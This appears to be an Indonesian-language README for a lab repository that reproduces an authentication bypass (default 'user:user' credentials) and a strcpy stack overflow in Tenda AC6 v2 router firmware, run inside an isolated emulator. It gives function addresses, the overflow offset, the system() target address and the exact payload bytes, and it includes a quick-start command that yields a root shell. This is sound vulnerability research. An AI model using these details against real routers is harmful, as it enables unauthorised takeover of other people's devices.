# Tenda AC6 v2 — Authentication Bypass & RCE (Reproducible Lab)

Reproduksi terisolasi dari dua kerentanan firmware **Tenda AC6 v2**
(`V15.03.06.51_multi`, Realtek RTL8197F):

1. **Backdoor account `user:user`** — kredensial default pada config (`sys.baseusername`/`sys.baseuserpass`).
2. **Stack buffer overflow** pada `form_fast_setting_wifi_set` (`strcpy(ssid)` tanpa batas) →
   kontrol saved `$ra` → **root shell**.

Semua pengujian dijalankan pada **emulator QEMU/FirmAE terisolasi** (user-net), tidak menyentuh perangkat/LAN asli.

> ⚠️ **Hanya untuk perangkat milik sendiri / lab pribadi.** Dilarang digunakan pada perangkat/network
> orang lain. Lihat `LICENSE`.

---

## Struktur

```
bootstrap.sh            Install dependency + FirmAE + container (sekali)
docker/run-firmae.sh    Jalankan container FirmAE (mount /dev + FirmAE + repo)
emulator/
  rootfs.tar.gz         Rootfs firmware (untuk makeImage)
  setup_emulator.sh     Build image.raw + tanam patch
  deploy_patches.sh     Tanam patch ke image.raw
  start_qemu.sh         Boot guest terisolasi (init=/firmadyne/console)
  reboot_guest.sh       Reboot guest & tunggu httpd siap
patches/                Binary hasil patch/exploit (httpd_rce, cfm_mib_dgram, libCfm, libapmib_patched, rc.g, console_elf, mib.sanitized.cfg)
src/                    Sumber asm patch + build.sh
firmware/               bin/httpd (orisinal, untuk analisis), libCfm, config contoh (diredaksi)
bn/                     Plugin Binary Ninja + daftar alamat/fungsi
docs/                   FINDINGS.md, screenshots/
book/                   Buku & Laporan final (docx + pdf)
exploit/                exploit.py, buat_payload.py, shell_demo.py, request Burp
FirmAE/                 FirmAE (sumber); binaries/kernel diunduh otomatis saat bootstrap
```

## Quick Start

```bash
git clone https://github.com/farrelfaiziaulhaq/tenda-ac6-rce.git
cd tenda-ac6-rce
./bootstrap.sh                                    # apt+pip, download FirmAE binaries, build fcore, start container
docker exec firmae-run bash /repo/emulator/setup_emulator.sh
./emulator/reboot_guest.sh                        # tunggu httpd=302
python3 exploit/exploit.py                        # -> ROOT SHELL di 172.17.0.2:2323
```

## Dependency

- Docker (`docker.io`), QEMU (`qemu-system-mips`, disediakan `fcore`), Python 3 + pip.
- Python: `pwntools` (exploit).
- `nmap`, `netcat` (opsional).
- **Binary Ninja** (untuk analisis statis) — buka `firmware/httpd`.
- **Burp Suite** (opsional, untuk login/token + kirim overflow).

## Analisis statis (Binary Ninja)

Buka `firmware/httpd` → view **High Level IL**. Lihat `bn/BN-ADDRESSES.md`. Fungsi kunci:

| Fungsi | Alamat | Peran |
|---|---|---|
| `getwebuserpwd` | `0x434694` | baca `sys.baseusername` / `sys.baseuserpass` (default `user`/`user`) |
| `check_password` | `0x437fc0` | cek `sys.userpass` |
| `form_fast_setting_wifi_set` | `0x477c20` | dua `strcpy(dest, ssid)` (overflow) |
| `system()` | `0x005047c0` | target `$ra` |

## Exploit

Detail: `exploit/README.md`. Ringkas:
- offset `748` (saved `$ra` di `fp+892`), alamat target `system = 0x005047c0`.
- payload: `b'A'*748 + p32(0x005047c0)[:3]` (3 byte; NUL ditambah `strcpy`).

## Catatan penting — celah asli vs harness emulasi

- **Celah asli** (pada firmware): overflow `strcpy` dan backdoor `user:user`.
- **Harness emulasi** (tambahan repo ini):
  - patch hook epilog / "cave" pada `bin/httpd` agar demo `$ra → system()` andal di QEMU;
  - `lib/libapmib.so` di-patch (`apmib_init`/`apmib_init_HW` → return 1) agar httpd melewati
    pembacaan config dari flash (yang tidak ada di emulator), dan `/cfg/mib.cfg` (disanitasi)
    disediakan sebagai config.
  Ini **bukan** bagian dari kerentanan asli. Di perangkat asli, RCE penuh memerlukan kontrol `$a0`
  (ROP / ret2stack), karena non-PIE dan NX off.

## Troubleshooting

- `httpd=000` / "Page not found": guest belum siap atau sudah crash → `./emulator/reboot_guest.sh`.
  Di emulasi hanya `/`, `/login/Auth`, `/goform/*` yang dimap (`/main.html` memang 400).
- `fcore` belum ada → `sudo ./FirmAE/docker-init.sh`.
- Loop sibuk saat setup → `docker exec firmae-run losetup -D`.
